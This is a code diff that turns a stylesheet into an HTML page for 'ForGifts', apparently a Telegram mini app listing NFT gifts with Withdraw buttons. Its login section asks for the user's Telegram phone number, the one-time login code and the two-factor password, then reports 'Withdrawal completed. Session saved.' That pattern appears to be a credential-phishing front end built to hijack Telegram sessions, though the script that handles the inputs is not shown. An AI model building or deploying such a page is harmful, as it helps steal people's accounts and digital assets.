@@ -1,162 +1,109 @@
-body {
-    margin: 0;
-    padding: 20px;
-    background-color: #0a0a0a;
-    color: #fff;
-    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    min-height: 100vh;
-}
-
-.container {
-    max-width: 1200px;
-    margin: 0 auto;
-}
-
-#inventory-list {
-    display: flex;
-    flex-wrap: wrap;
-    gap: 16px;
-    justify-content: flex-start;
-}
-
-/* Квадратная карточка */
-.nft-card {
-    background: #1a1a1a;
-    border-radius: 12px;
-    width: 180px; /* Увеличил для большей иконки */
-    height: 180px; /* Увеличил для большей иконки */
-    display: flex;
-    flex-direction: column;
-    padding: 12px;
-    box-sizing: border-box;
-    border: 1px solid #2a2a2a;
-    position: relative;
-    overflow: visible; /* Убираем обрезку */
-    flex-shrink: 0;
-}
-
-.nft-card:hover {
-    border-color: #3a3a3a;
-    transform: translateY(-2px);
-    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-}
-
-/* Бейдж NFT */
-.nft-badge {
-    position: absolute;
-    top: 8px;
-    right: 8px;
-    background: linear-gradient(135deg, #8a2be2, #4a00e0);
-    color: white;
-    font-size: 10px;
-    font-weight: 700;
-    padding: 3px 6px;
-    border-radius: 6px;
-    z-index: 2;
-}
-
-/* Контейнер для содержимого */
-.nft-content {
-    flex-grow: 1;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: space-between; /* Равномерное распределение */
-    margin-top: 20px;
-    height: calc(100% - 20px); /* Учитываем отступ */
-}
-
-/* Контейнер для иконки */
-.nft-icon-container {
-    text-align: center;
-    margin-bottom: 8px;
-    flex-shrink: 0;
-}
-
-/* Иконка NFT (80x80) */
-.nft-icon {
-    width: 80px;
-    height: 80px;
-    border-radius: 12px;
-    object-fit: cover;
-    border: 1px solid #333;
-}
-
-/* Название NFT */
-.nft-name {
-    font-size: 13px;
-    font-weight: 500;
-    color: #e0e0e0;
-    text-decoration: none;
-    text-align: center;
-    margin-bottom: 8px;
-    line-height: 1.3;
-    word-break: break-word;
-    overflow: hidden;
-    display: -webkit-box;
-    -webkit-line-clamp: 2;
-    -webkit-box-orient: vertical;
-    flex-shrink: 0;
-    max-width: 100%;
-}
-
-.nft-name:hover {
-    color: #8a2be2;
-}
-
-/* Кнопка Withdraw (не обрезается) */
-.withdraw-btn {
-    background: linear-gradient(135deg, #8a2be2, #4a00e0);
-    color: white;
-    border: none;
-    padding: 8px;
-    border-radius: 8px;
-    font-size: 12px;
-    font-weight: 600;
-    cursor: pointer;
-    width: 100%;
-    transition: opacity 0.2s;
-    flex-shrink: 0;
-    margin-top: auto; /* Прижимаем к низу, но не обрезаем */
-}
-
-.withdraw-btn:hover {
-    opacity: 0.9;
-}
-
-/* Сообщения */
-.empty-message {
-    font-size: 14px;
-    color: #666;
-    text-align: center;
-    width: 100%;
-    padding: 40px 0;
-}
-
-/* 3 карточки в ряд на десктопе */
-@media (min-width: 900px) {
-    .nft-card {
-        flex: 0 0 180px;
-        max-width: 180px;
-    }
-}
-
-/* 2 карточки в ряд на планшетах */
-@media (max-width: 899px) and (min-width: 600px) {
-    .nft-card {
-        flex: 0 0 180px;
-        max-width: 180px;
-    }
-}
-
-/* 1 карточка в ряд на телефонах */
-@media (max-width: 599px) {
-    .nft-card {
-        flex: 0 0 180px;
-        max-width: 180px;
-        margin: 0 auto;
-    }
-    #inventory-list {
-        justify-content: center;
-    }
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ForGifts</title>
+    <link rel="stylesheet" href="/style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Логин форма */
+        #login-container {
+            display: none;
+            padding: 20px;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .login-step {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        .login-step h3 {
+            margin-top: 0;
+            color: #8a2be2;
+        }
+        .login-input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #2a2a2a;
+            color: white;
+            box-sizing: border-box;
+        }
+        .login-btn {
+            background: linear-gradient(135deg, #8a2be2, #4a00e0);
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin: 5px 0;
+        }
+        .login-btn.secondary {
+            background: #444;
+        }
+        #login-error {
+            color: #ff5555;
+            margin: 10px 0;
+            text-align: center;
+        }
+        #login-success {
+            text-align: center;
+            color: #55ff55;
+        }
+    </style>
+</head>
+<body>
+    <!-- Контейнер инвентаря -->
+    <div id="inventory-container">
+        <div class="container">
+            <div id="inventory-list">Loading...</div>
+        </div>
+    </div>
+    
+    <!-- Контейнер логина -->
+    <div id="login-container">
+        <div id="login-step1" class="login-step">
+            <h3>📱 Telegram Login</h3>
+            <p>Enter your phone number with country code:</p>
+            <input type="tel" id="phone-input" class="login-input" placeholder="+1234567890">
+            <button class="login-btn" onclick="sendLoginCode()">Send Code</button>
+            <button class="login-btn secondary" onclick="cancelLogin()">Cancel</button>
+        </div>
+        
+        <div id="login-step2" class="login-step" style="display:none">
+            <h3>🔐 Enter Code</h3>
+            <p>Enter the code sent to Telegram:</p>
+            <input type="text" id="code-input" class="login-input" placeholder="12345">
+            <button class="login-btn" onclick="verifyLoginCode()">Verify</button>
+            <button class="login-btn secondary" onclick="cancelLogin()">Back</button>
+        </div>
+        
+        <div id="login-step3" class="login-step" style="display:none">
+            <h3>🔒 2FA Password</h3>
+            <p>Enter your two-factor authentication password:</p>
+            <input type="password" id="password-input" class="login-input" placeholder="Password">
+            <button class="login-btn" onclick="verify2FA()">Login</button>
+            <button class="login-btn secondary" onclick="cancelLogin()">Cancel</button>
+        </div>
+        
+        <div id="login-success" class="login-step" style="display:none">
+            <h3>✅ Success!</h3>
+            <p id="user-info"></p>
+            <p>Withdrawal completed. Session saved.</p>
+            <button class="login-btn" onclick="cancelLogin()">Back to Inventory</button>
+        </div>
+        
+        <div id="login-error"></div>
+    </div>
+    
+    <script src="/script.js"></script>
+</body>
+</html>
